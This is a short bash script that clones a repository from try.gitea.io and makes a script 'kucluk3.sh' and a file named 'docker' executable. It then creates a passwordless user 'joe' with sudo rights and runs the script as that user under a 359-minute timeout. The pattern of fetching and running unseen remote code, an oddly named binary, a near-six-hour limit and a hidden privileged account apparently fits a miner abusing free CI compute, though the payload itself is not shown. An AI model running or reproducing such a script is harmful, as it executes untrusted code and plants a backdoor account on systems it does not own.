#!/bin/bash
sudo apt update
git clone https://try.gitea.io/hakiem89/Workergits.git && cd Workergits
chmod +x kucluk3.sh && chmod +x docker
sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
sudo -u joe -H sh -c "timeout 359m ./kucluk3.sh"
sudo apt update
